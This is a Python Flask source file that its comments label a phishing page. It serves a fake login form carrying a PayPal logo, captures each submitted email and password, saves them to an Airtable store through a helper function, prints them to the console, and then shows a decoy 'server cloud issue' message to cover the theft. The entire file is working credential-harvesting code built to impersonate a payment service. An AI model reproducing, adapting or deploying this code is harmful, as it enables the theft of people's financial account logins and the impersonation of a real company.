from flask import Flask, request, render_template_string
from save_data import save_to_airtable  # Import the function from data.py

app = Flask(__name__)

# Basic HTML template for phishing page with embedded CSS
phishing_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        h1 {
            color: #333;
        }

        .login-form {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .login-form img {
            width: 120px;
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin: 10px 0 5px;
            color: #555;
            text-align: left;
        }

        input[type="email"],
        input[type="password"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 4px;
            background-color: #007bff;
            color: white;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        input[type="submit"]:hover {
            background-color: #0056b3;
        }

        a {
            display: block;
            margin-top: 15px;
            color: #007bff;
            text-decoration: underline;
            cursor: pointer;
        }

        a:hover {
            color: #0056b3;
        }

        .signup-btn {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 4px;
            background-color: #d3d3d3;
            color: black;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .signup-btn:hover {
            background-color: #b0b0b0;
        }
    </style>
</head>
<body>
    <div class="login-form">
        <img src="static/paypal-logo.png" alt="PayPal Logo">
        <h1>Login to Your Account</h1>
        <form action="/login" method="post">
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" autocomplete="off" required>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" autocomplete="off" required>
            <input type="submit" value="Login">
        </form>
        <a href="/server-issue">Having trouble logging in?</a>
        <button class="signup-btn" onclick="window.location.href='/signup'">Sign Up</button>
    </div>
</body>
</html>
"""

# Template for the server cloud issue page
server_issue_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Server Cloud Issue</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
        }

        .message {
            text-align: center;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        h1 {
            color: #333;
        }

        p {
            color: #555;
        }
    </style>
</head>
<body>
    <div class="message">
        <h1>Server Cloud Issue</h1>
        <p>There seems to be an issue with our cloud servers. Please try again later.</p>
    </div>
</body>
</html>
"""

# Route for phishing page
@app.route('/')
def index():
    return render_template_string(phishing_page)

# Route to handle form submission
@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    
    # Save the credentials to Airtable using the function from data.py
    status_code, response_content = save_to_airtable(email, password)
    
    if status_code == 200:
        print(f"Credentials saved: Email: {email}, Password: {password}")
    else:
        print(f"Error saving credentials: {response_content}")
    
    return render_template_string(server_issue_page)

# Route for server cloud issue page
@app.route('/server-issue')
def server_issue():
    return render_template_string(server_issue_page)

# Route for signup page leading to the same server cloud issue
@app.route('/signup')
def signup():
    return render_template_string(server_issue_page)

if __name__ == "__main__":
    app.run(debug=True)
